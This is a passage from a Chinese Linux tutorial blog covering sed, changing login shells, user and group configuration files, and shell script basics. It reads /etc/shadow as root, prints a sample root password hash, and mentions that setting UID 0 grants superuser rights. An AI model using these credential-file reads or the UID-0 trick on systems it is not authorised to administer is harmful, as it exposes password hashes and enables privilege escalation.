命令是利用脚本来处理文本文件。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">sed</span> 可依照脚本的指令来处理、编辑文本文件。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>语法</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">sed</span> <span class=\"token punctuation\">[</span>-hnV<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-e<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-f<span class=\"token operator\">&lt;</span>script文件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>文本文件<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>参数说明：</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>-e<span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span>或--expression<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span> 以选项中指定的script来处理输入的文本文件。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-f<span class=\"token operator\">&lt;</span>script文件<span class=\"token operator\">></span>或--file<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span>script文件<span class=\"token operator\">></span> 以选项中指定的script文件来处理输入的文本文件。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>-h或--help 显示帮助。</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>-n或--quiet或--silent 仅显示script处理后的结果。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>-V或--version 显示版本信息。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>动作说明：</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现<span class=\"token punctuation\">(</span>目前的下一行<span class=\"token punctuation\">)</span>～</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现<span class=\"token punctuation\">(</span>目前的上一行<span class=\"token punctuation\">)</span>；</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 <span class=\"token function\">sed</span> -n 一起运行～</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 <span class=\"token number\">1</span>,20s/old/new/g 就是啦！</pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>实例</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>在testfile文件的第四行后添加一行，并将结果输出到标准输出，在命令行提示符下输入如下命令：</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">sed</span> -e 4a<span class=\"token punctuation\">\\</span>newLine testfile </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>首先查看testfile中的内容如下：</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile <span class=\"token comment\">#查看 testfile 中的内容  </span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>HELLO LINUX<span class=\"token operator\">!</span>  </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>Linux is a <span class=\"token function\">free</span> unix-type opterating system.  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>This is a linux testfile<span class=\"token operator\">!</span>  </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>Linux <span class=\"token builtin class-name\">test</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>使用sed命令后，输出结果如下：</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>$ <span class=\"token function\">sed</span> -e 4a<span class=\"token punctuation\">\\</span>newline testfile <span class=\"token comment\">#使用 sed 在第四行后添加新字符串  </span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>HELLO LINUX<span class=\"token operator\">!</span> <span class=\"token comment\">#testfile 文件原有的内容  </span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>Linux is a <span class=\"token function\">free</span> unix-type opterating system.  </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>This is a linux testfile<span class=\"token operator\">!</span>  </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Linux <span class=\"token builtin class-name\">test</span>  </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>newline</pre></td></tr></table></figure><h2 id=\"linux中的shell如何切换\"><a class=\"anchor\" href=\"#linux中的shell如何切换\">#</a> Linux 中的 shell 如何切换</h2>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2plcnJ5XzExMjYvYXJ0aWNsZS9kZXRhaWxzLzg1MjI0NzM3\"> https://blog.csdn.net/jerry_1126/article/details/85224737</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>方法一: chsh -s /bin/ksh</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># chsh -s /bin/ksh           # 修改用户默认的 shell 为 ksh</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Changing shell <span class=\"token keyword\">for</span> root.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Shell not changed.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># egrep 'root' /etc/passwd   # 查看修改是否成功，按 CTRL+D 退出下次生效</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>root:x:0:0:root:/root:/bin/ksh </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>方法二: <span class=\"token function\">usermod</span> -s /bin/ksh root</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># usermod -s /bin/ksh root</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>其他命令或者相互操作:</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>查看当前使用的shell</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># echo $SHELL</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>/bin/bash</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># 或者</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># egrep 'root' /etc/passwd</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>root:x:0:0:root:/root:/bin/bash </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>查看所有可用的shell</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/shells</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>/bin/sh</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>/bin/bash</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>/bin/ksh</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>/bin/zsh</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>/bin/csh</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 或者</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">[</span>root@host ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># chsh -l</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>/bin/sh</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>/bin/bash</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>/bin/ksh</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>/bin/zsh</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>/bin/csh</pre></td></tr></table></figure><h2 id=\"vi编辑器\"><a class=\"anchor\" href=\"#vi编辑器\">#</a> vi 编辑器</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h1 id=\"用户-组和权限\"><a class=\"anchor\" href=\"#用户-组和权限\">#</a> 用户、组和权限</h1>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemhvbmdndWl5YW8vcC85MTY1OTE3Lmh0bWw=\"> https://www.cnblogs.com/zhongguiyao/p/9165917.html</span> 超级详细</p>\n<p>Linux 系统是一个多用户操作系统，从本机或远程登录的多个用户能共同使用同一计算机，同时访问同一设备。<br />\nLinux 系统进行用户和组管理的目的在于保证系统中数据与文件的安全。</p>\n<h2 id=\"用户账户管理\"><a class=\"anchor\" href=\"#用户账户管理\">#</a> 用户账户管理</h2>\n<p>Linux/Unix 是一个用户、多任务的操作系统；在讲 Linux 账号及账户组管理之前，先简单了解一下多用户、多任务操作系统的基本概念。</p>\n<h3 id=\"linux的单用户多任务\"><a class=\"anchor\" href=\"#linux的单用户多任务\">#</a> Linux 的单用户多任务</h3>\n<p>在 Linux 下，当你登录后，你也可以同时开启很多的服务任务和进程，而各自服务都会跑的很好却对其他任务没有任何影响，这种登录一个用户登录系统执行多个服务任务和进程的情况，就称为单用户多任务。</p>\n<h3 id=\"linux的多用户多任务\"><a class=\"anchor\" href=\"#linux的多用户多任务\">#</a> Linux 的多用户多任务</h3>\n<p>有时可能是很多用户同时用同一个系统，如公司几十个运维人员，每台机器都可以和被若干个运维人员登录部署或解决相关故障问题，但并不是所有的运维人员都要做同一件事，所以就有了多任务、多用户的情况。</p>\n<p>值得注意的是：多用户、多任务并不是大家同时挤到一起，在一台机器的键盘和显示器前来操作机器，多用户可能是通过 SSH 客户端工具等远程工具等远程登录服务器来进行，比如对服务器的运程控制，只要具有相关用户的权限，任何人都是可以上去操作访问服务器。</p>\n<h2 id=\"linux系统用户角色划分\"><a class=\"anchor\" href=\"#linux系统用户角色划分\">#</a> linux 系统用户角色划分</h2>\n<p>用户在系统中是分角色的，在 Linux 系统中，由于角色的不同，权限和所完成的任务也不同；值得注意的是用户的角色是通过 UID 和 GID 识别的；特别是 UID，在运维工作中，一个 UID 是唯一标识一个系统用户的账号。</p>\n<p>用户账户：</p>\n<p>超级用户 root（0）<br />\n程序用户（1~499）<br />\n普通用户（500~65535）</p>\n<p>超级用户：</p>\n<pre><code>默认是root用户，其UID和GID均为0。在每台unix/linux操作系统中都是唯一且真实存在的，通过它可以登录系统，可以操作系统中任何文件\n和命令，\n拥有最高的管理权限。在生产环境，一般禁止root账号远程登录SSH连接服务器，以加强系统安全。\n</code></pre>\n<p>普通用户：</p>\n<pre><code>这类用户一般是由具备系统管理员root的权限的运维人员添加的。\n</code></pre>\n<p>程序用户：</p>\n<pre><code>与真实用户区分开来，这类用户的最大特点是安装系统后默认就会存在的，且默认情况不能登录系统，它们是系统正常运行\n必不可少的，他们的存在主要是方便系统管理，满足相应的系统进程都文件属主的要求。例如系统默认的bin、adm、nodoby、mail用户等。\n由于服务器角色的不同，有部分用不到的系统服务被禁止开机执行，因此，在做系统安全优化时，被禁止开机启动了的服务对应的虚拟用户\n也是可以处理掉的(删除或注释)。\n</code></pre>\n<h2 id=\"用户及用户组配置文件介绍\"><a class=\"anchor\" href=\"#用户及用户组配置文件介绍\">#</a> 用户及用户组配置文件介绍</h2>\n<p>Linux 系统中下的账户文件主要有 /etc/passwd、/etc/shadow、/etc/group、/etc/gshadow 四个文件。</p>\n<h3 id=\"与用户相关的配置文件\"><a class=\"anchor\" href=\"#与用户相关的配置文件\">#</a> 与用户相关的配置文件</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/etc/passwd:  <span class=\"token comment\">#用户的配置文件， 保存用户账户的基本信息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/etc/shadow  <span class=\"token comment\">#用户影子口令文件</span></pre></td></tr></table></figure><p>用户的配置文件 /etc/passwd<br />\n/etc/passwd 文件中每行定义一个用户账号，有多少行就表示多少个账号，在一行中可以清晰的看出，各内容之间又通过”:” 号划分了 7 个字段，这 7 个字段分别定义了账号的不同属性，passwd 文件实际内容如下:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># head -5 /etc/passwd</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:x:0:0:root:/root:/bin/bash</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bin:x:1:1:bin:/bin:/sbin/nologin</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>daemon:x:2:2:daemon:/sbin:/sbin/nologin</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>adm:x:3:4:adm:/var/adm:/sbin/nologin</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</pre></td></tr></table></figure><p>在 passwd 文件中，第一行内容就是超级用户 root 行，可以看到它的 uid 和 gid 都为 0. 为了方便理解，下面是各字段的描述：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>字段1：帐号名，这是用户登陆时使用的账户名称，在系统中是唯一的，不能重名</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>字段2：密码占位符x；早期的unix系统中，该字段是存放账户和密码的，由于安全原因，后来把这个密码字段内容移到/etc/shadow中了。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>　　　　　　这里可以看到一个字母x，表示该用户的密码是/etc/shadow文件中保护的。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段3：<span class=\"token environment constant\">UID</span>；范围是0-65535</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>字段4：GID；范围是0-65535；当添加用户时，默认情况下会同时建立一个与用户同名且<span class=\"token environment constant\">UID</span>和GID相同的组。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>字段5：用户说明；这个字段是对这个账户的说明</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>字段6：宿主目录；用户登陆后首先进入的目录，一般与<span class=\"token string\">\"/home/用户名\"</span>这样的目录</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>字段7：登录Shell   当前用户登陆后所使用的shell，在centos/rhel系统中，默认的shell是bash；如果不希望用户登陆系统，可以通过usermod</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>　　　　　　或者手动修改passwd设置，将该字段设置为/sbin/nologin 即可。大多数内置系统账户都是/sbin/nologin,这表示禁止登陆系统。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>　　　　　　这是出于安全考虑的。</pre></td></tr></table></figure><h4 id=\"passwd中有关uid的限制说明\"><a class=\"anchor\" href=\"#passwd中有关uid的限制说明\">#</a> passwd 中有关 UID 的限制说明</h4>\n<p>0：当用户的 UID 为 0 时，表示这个账户为超级用户；如果要增加一个系统管理员账户的话，只需将该账户的 UID 改为 0 即可。不建议<br />\n 1~499：这个范围是保留给系统用户使用的 UID<br />\n500~65535：普通账户 UID<br />\n 最后，来看一下 /etc/passwd 的权限：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ls -l /etc/passwd</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>-rw-r--r--. <span class=\"token number\">1</span> root root <span class=\"token number\">1665</span> <span class=\"token number\">4</span>月  <span class=\"token number\">11</span> <span class=\"token number\">14</span>:13 /etc/passwd</pre></td></tr></table></figure><p>因为每个用户登录时都需要取得 UID 和 GID 来判断权限问题，所以 /etc/passwd 的权限为 644，这样一来就会带来安全问题，即所有的用户都可以都 /etc/passwd 文件，即使文件内的密码是加密的，但还是存在一定的被攻击破解的安全隐患。因此，就有了 /etc/shadow 文件。</p>\n<h4 id=\"用户的影子口令文件etcshadow\"><a class=\"anchor\" href=\"#用户的影子口令文件etcshadow\">#</a> 用户的影子口令文件 /etc/shadow</h4>\n<p>由于 passwd 文件必须要被所有的用户读，所以会带来安全隐患。而 shadow 文件就是为了解决这个安全隐患而增加的。</p>\n<p>来看一下 /etc/shadow 的权限：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ls -l /etc/shadow</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>----------. <span class=\"token number\">1</span> root root <span class=\"token number\">1059</span> <span class=\"token number\">4</span>月  <span class=\"token number\">11</span> <span class=\"token number\">14</span>:13 /etc/shadow</pre></td></tr></table></figure><p>其文件内容为：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># head -5 /etc/shadow</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:<span class=\"token variable\">$6</span><span class=\"token variable\">$jmM2rFzPCFbmqBkf</span><span class=\"token variable\">$oz3AUooR3qaV5uXU67HcXlYiE3hNf0sSsunk1eBTDPrGUOM1xYCyesGoj</span>.ZLTIzdiXEdrnnqNyC5g8SsRnxQm.:16338:0:99999:7:::</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bin:*:15615:0:99999:7:::</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>daemon:*:15615:0:99999:7:::</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>adm:*:15615:0:99999:7:::</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>lp:*:15615:0:99999:7:::</pre></td></tr></table></figure><p>和 /etc/passwd 一样，shadow 文件的每一行内容，也是以冒号 (:) 作为分隔符，共 9 个字段，其各个字段的意义如下表：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>字段1：帐号名称</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>字段2：加密的密码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>字段3：最近更改密码的时间；从1970/1/1到上次修改密码的天数</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段4：禁止修改密码的天数；从1970/1/1开始，多少天之内不能修改密码，默认值为0</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>字段5：用户必须更改口令的天数；密码的最长有效天数，默认值为99999</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>字段6：警告更改密码的期限；密码过期之前警告天数，默认值为7；在用户密码过期前多少天提醒用户更改密码</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>字段7：不活动时间；密码过期之后账户宽限时间 <span class=\"token number\">3</span>+5；在用户密码过期之后到禁用账户的天数</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>字段8：帐号失效时间，默认值为空；从1970/1/1日起，到用户被禁用的天数</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>字段9：保留字段（未使用），标志</pre></td></tr></table></figure><p>密码过期：一旦超过密码过期日期，用户成功登陆，Linux 会强迫用户设置一个新密码，设置完成后才开启 Shell 程序<br />\n账户过期：若超过账户过期日期，Linux 会禁止用户登陆系统，即使输入正确密码，也无法登陆</p>\n<h3 id=\"与用户组相关的配置文件\"><a class=\"anchor\" href=\"#与用户组相关的配置文件\">#</a> 与用户组相关的配置文件</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>/etc/group  <span class=\"token comment\">#用户组配置文件</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>/etc/gshadow  <span class=\"token comment\">#用户组的影子文件</span></pre></td></tr></table></figure><h4 id=\"用户组配置文件etcgroup\"><a class=\"anchor\" href=\"#用户组配置文件etcgroup\">#</a> 用户组配置文件 /etc/group</h4>\n<p>/etc/group 文件是用户组的配置文件，内容包括用户与用户组，并且能显示用户归属哪个用户组，因为一个用户可以归属一个或多个不同的用户组；同一用户组的用户之间具有相似的特性。如果某个用户下有对系统管理有最重要的内容，最好让用户拥有独立的用户组，或者是把用户下的文件的权限设置为完全私有；另外 root 用户组一般不要轻易把普通用户加入进入。</p>\n<p>/etc/group 文件就是记录 GID 与用户组的文件。/etc/group 文件同 /etc/passwd 类似，其文件权限也是 644：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ls -l /etc/group</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>-rw-r--r--. <span class=\"token number\">1</span> root root <span class=\"token number\">832</span> <span class=\"token number\">4</span>月  <span class=\"token number\">11</span> <span class=\"token number\">14</span>:13 /etc/group</pre></td></tr></table></figure><p>/etc/group 的文件内容为：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># head -5 /etc/group</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>root:x:0:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>bin:x:1:bin,daemon</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>daemon:x:2:bin,daemon</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sys:x:3:bin,adm</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>adm:x:4:adm,daemon</pre></td></tr></table></figure><p>group 文件各个字段的详细说明：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>字段1：组账户名称</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>字段2：密码占位符x；通常不需要设置该密码，由于安全原因，该密码被记录在/etc/gshadow中，因此显示为<span class=\"token string\">'x'</span>。这类似/etc/shadow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>字段3：组账户GID号,用户组ID</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段4：本组的成员用户列表；加入这个组的所有用户账号</pre></td></tr></table></figure><h4 id=\"用户组的影子文件etcgshadow\"><a class=\"anchor\" href=\"#用户组的影子文件etcgshadow\">#</a> 用户组的影子文件 /etc/gshadow</h4>\n<p>/etc/gshaow 是 /etc/group 的加密文件，比如用户组的管理密码就是存放在这个文件。/etc/group 和 /etc/gshadow 是互补的两个文件；比如大型服务器，针对很多用户和用户组，定制一些关系结构比较复杂的额权限模型，设置用户组密码是极有必要的。比如不想让一些非用户组成员永久拥有用户组的权限和特性，这时就可以通过密码验证的方式来让某些用户临时拥有一些用户组特性，这时就要用到用户组密码；/etc/gshadow 格式如下，每个用户组独占一行；</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># ls -l /etc/gshadow</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>----------. <span class=\"token number\">1</span> root root <span class=\"token number\">682</span> <span class=\"token number\">4</span>月  <span class=\"token number\">11</span> <span class=\"token number\">14</span>:13 /etc/gshadow</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>root@Web ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># head -5 /etc/gshadow</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>root:::</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bin:::bin,daemon</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>daemon:::bin,daemon</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys:::bin,adm</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>adm:::adm,daemon</pre></td></tr></table></figure><p>gshadow 文件中各个字段详细说明：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>字段1：组账号的名称</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>字段2：加密后的密码字符串，这个字段可以空的或者<span class=\"token operator\">!</span>；如果是空的或有！，表示没有密码</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>字段3：本组的管理员列表；这个字段也可为空；如果有多个用户组管理员，用,号分隔</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>字段4：本组的成员列表；加入这个组的所有用户账户；列表中多个用户通过<span class=\"token string\">\",\"</span>分隔</pre></td></tr></table></figure><h2 id=\"常用命令\"><a class=\"anchor\" href=\"#常用命令\">#</a> 常用命令</h2>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h1 id=\"文件系统\"><a class=\"anchor\" href=\"#文件系统\">#</a> 文件系统</h1>\n<h1 id=\"进程管理\"><a class=\"anchor\" href=\"#进程管理\">#</a> 进程管理</h1>\n<h1 id=\"shell脚本\"><a class=\"anchor\" href=\"#shell脚本\">#</a> Shell 脚本</h1>\n<p>Shell 脚本设计就是根据程序设计的三种基本结构，即顺序、选择和循环，以及 Shell 脚本的语法规则来来编写 Shell 脚本。</p>\n<p>为了能在不同的 Shell 环境下都解释执行 Shell 脚本的第一行最好为： <code>#!/bin/bash</code>  申明该脚本有 bash 来解释，便于移植到其他系统上也以 bash 来解释。</p>\n<h2 id=\"三种执行方法\"><a class=\"anchor\" href=\"#三种执行方法\">#</a> 三种执行方法</h2>\n<ol>\n<li>\n<p>sh 命令<br />\n这种方法不需要把编辑好的脚本权设置为可执行。只需要在当前目录下输入 “sh 脚本名”，回车即可。</p>\n</li>\n<li>\n<p>./ 脚本名</p>\n</li>\n</ol>\n<p>添加可执行权限，然后在当前面目录下键入./ 脚本名，回车即可。</p>\n<ol start=\"3\">\n<li>脚本名</li>\n</ol>\n<p>首先需要添加可执行权限，然后把脚本所在目录添加到搜索路径（./bash_profile 文件）中。</p>\n<p>此后无论在哪里直接执行脚本名就可。</p>\n<h2 id=\"shell命令的执行顺序\"><a class=\"anchor\" href=\"#shell命令的执行顺序\">#</a> Shell 命令的执行顺序</h2>\n<h3 id=\"顺序执行\"><a class=\"anchor\" href=\"#顺序执行\">#</a> 顺序执行</h3>\n<ol>\n<li>顺序分隔符 (😉<br />\n多条命令可以在一行中输出，但各命令应以分号 (;) 隔开。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cd /home;ifconfig > 1.txt;echo 666</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span>root@node home<span class=\"token punctuation\">]</span><span class=\"token comment\"># ls</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">1</span>.txt  hadoop</pre></td></tr></table></figure><ol start=\"2\">\n<li>管道 (|)<br />\n 管道也是顺序执行</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@node home<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/passwd |wc -l> 1.txt</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span>root@node home<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat 1.txt </span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">43</span></pre></td></tr></table></figure><h3 id=\"逻辑与和逻辑或\"><a class=\"anchor\" 